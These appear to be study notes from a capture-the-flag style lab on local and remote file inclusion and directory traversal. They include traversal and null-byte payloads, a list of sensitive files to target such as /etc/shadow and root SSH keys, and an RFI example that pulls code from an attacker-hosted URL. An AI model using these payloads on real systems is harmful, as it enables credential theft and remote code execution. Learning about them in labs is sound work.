There are two types of file inclusion methods.

#### Local file inclusion and Remote file inclusion and Directory traversal
LFI, RFI

Some web apps are written in way that request access to files on a server via strings in the url
http://webapp.thm/get.php?file=userCV.pdf

file - parameter
userCV.pdf - file to access

#### Path / Directory traversal

Is a vulnerability that allows an attacker to read the local files in the server.
It is exploited by changing the URL to locate and access files and directories outside the web servers directory.

This vulnerability occurs when there is no, or not good enough input validation of user input or use of functions that access files and the user can interact with said function.

The web app path is usually something like:  /var/www/app/

Testing this via payloads of dot dot slash attack to see if the url parameter is vulnerable to the attack.

Here is an example attack
http://webapp.thm/get.php?file=../../../../etc/passwd

Each .. moves directory location one step back, just like cd .. command does.
In this case we are moving from.
CVs ../ app ../ www ../ var ../  /etc /passwd

Similarly, if the web application runs on a Windows server, the attacker needs to provide Windows paths. For example, if the attacker wants to read the boot.ini file located in c:\boot.ini, then the attacker can try the following depending on the target OS version:

http://webapp.thm/get.php?file=../../../../boot.ini or

http://webapp.thm/get.php?file=../../../../windows/win.ini  

The same concept applies here as with Linux operating systems, where we climb up directories until it reaches the root directory, which is usually c:\.  

Sometimes, developers will add filters to limit access to only certain files or directories. Below are some common OS files you could use when testing.

|                             |                                                                                                                                                                   |
| --------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Location**                | **Description**                                                                                                                                                   |
| /etc/issue                  | contains a message or system identification to be printed before the login prompt.                                                                                |
| /etc/profile                | controls system-wide default variables, such as Export variables, File creation mask (umask), Terminal types, Mail messages to indicate when new mail has arrived |
| /proc/version               | specifies the version of the Linux kernel                                                                                                                         |
| /etc/passwd                 | has all registered user that has access to a system                                                                                                               |
| /etc/shadow                 | contains information about the system's users' passwords                                                                                                          |
| /root/.bash_history         | contains the history commands for root user                                                                                                                       |
| /var/log/dmessage           | contains global system messages, including the messages that are logged during system startup                                                                     |
| /var/mail/root              | all emails for root user                                                                                                                                          |
| /root/.ssh/id_rsa           | Private SSH keys for a root or any known valid user on the server                                                                                                 |
| /var/log/apache2/access.log | the accessed requests for Apache  webserver                                                                                                                       |
| C:\boot.ini                 | contains the boot options for computers with BIOS firmware                                                                                                        |

## LFI

Is when you can read local files on the server.
Example of reading a file: /lab1.php?file=/etc/passwd

It seems we could move out of the PHP directory but still, the include function reads the input with .php at the end! This tells us that the developer specifies the file type to pass to the include function. To bypass this scenario, we can use the NULL BYTE, which is %00.  

Using null bytes is an injection technique where URL-encoded representation such as %00 or 0x00 in hex with user-supplied data to terminate strings. You could think of it as trying to trick the web app into disregarding whatever comes after the Null Byte.  

By adding the Null Byte at the end of the payload, we tell the  include function to ignore anything after the null byte which may look like:

include("languages/../../../../../etc/passwd%00").".php"); which equivalent to → include("languages/../../../../../etc/passwd");

NOTE: the %00 trick is fixed and not working with PHP 5.3.4 and above.

lab3.php?file=../../../../etc/passwd%00

## RFI

Remote File Inclusion (RFI) is a technique to include remote files into a vulnerable application. Like LFI, the RFI occurs when improperly sanitizing user input, allowing an attacker to inject an external URL into include function. One requirement for RFI is that the allow_url_fopen option needs to be on.  

  

The risk of RFI is higher than LFI since RFI vulnerabilities allow an attacker to gain Remote Command Execution (RCE) on the server. Other consequences of a successful RFI attack include:

- Sensitive Information Disclosure
- Cross-site Scripting (XSS)
- Denial of Service (DoS)

  

An external server must communicate with the application server for a successful RFI attack where the attacker hosts malicious files on their server. Then the malicious file is injected into the include function via HTTP requests, and the content of the malicious file executes on the vulnerable application server.  

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/b0c2659127d95a0b633e94bd00ed10e0.png)  

RFI steps

The following figure is an example of steps for a successful RFI attack! Let's say that the attacker hosts a PHP file on their own server http://attacker.thm/cmd.txt where cmd.txt contains a printing message  Hello THM.

```php
<?PHP echo "Hello THM"; ?>
```

First, the attacker injects the malicious URL, which points to the attacker's server, such as http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt. If there is no input validation, then the malicious URL passes into the include function. Next, the web app server will send a GET request to the malicious server to fetch the file. As a result, the web app includes the remote file into include function to execute the PHP file within the page and send the execution content to the attacker. In our case, the current page somewhere has to show the Hello THM message.

